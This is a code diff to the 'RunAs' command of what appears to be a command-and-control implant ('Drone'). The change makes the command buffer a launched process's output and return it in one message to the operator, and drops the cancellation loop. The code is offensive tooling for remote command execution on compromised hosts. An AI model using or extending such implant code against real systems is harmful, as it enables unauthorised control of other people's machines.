@@ -1,6 +1,6 @@
-﻿using System;
-using System.Diagnostics;
+﻿using System.Diagnostics;
 using System.Linq;
+using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
 
@@ -9,7 +9,7 @@ namespace Drone.Commands;
 public sealed class RunAs : DroneCommand
 {
     public override byte Command => 0x3C;
-    public override bool Threaded => true;
+    public override bool Threaded => false;
 
     public override async Task Execute(DroneTask task, CancellationToken cancellationToken)
     {
@@ -31,40 +31,30 @@ public sealed class RunAs : DroneCommand
                 UseShellExecute = false
             }
         };
+        
+        var sb = new StringBuilder();
 
         // inline function
-        async void OnDataReceived(object sender, DataReceivedEventArgs e)
+        void OnDataReceived(object sender, DataReceivedEventArgs e)
         {
-            await Drone.SendTaskOutput(new TaskOutput(task.Id, TaskStatus.RUNNING, e.Data + Environment.NewLine));
+            sb.AppendLine(e.Data);
         }
         
         // send output on data received
         process.OutputDataReceived += OnDataReceived;
         process.ErrorDataReceived += OnDataReceived;
 
+        // run process
         process.Start();
         process.BeginOutputReadLine();
         process.BeginErrorReadLine();
-        
-        // send a task running
-        await Drone.SendTaskRunning(task.Id);
-        
-        // don't use WaitForExit
-        while (!process.HasExited)
-        {
-            // has the token been cancelled?
-            if (cancellationToken.IsCancellationRequested)
-            {
-                process.OutputDataReceived -= OnDataReceived;
-                process.ErrorDataReceived -= OnDataReceived;
-                process.Kill();
-                
-                break;
-            }
-            
-            Thread.Sleep(100);
-        }
+        process.WaitForExit();
 
-        await Drone.SendTaskComplete(task.Id);
+        // send output
+        await Drone.SendTaskOutput(task.Id, sb.ToString());
+        
+        // remove events
+        process.OutputDataReceived -= OnDataReceived;
+        process.ErrorDataReceived -= OnDataReceived;
     }
 }
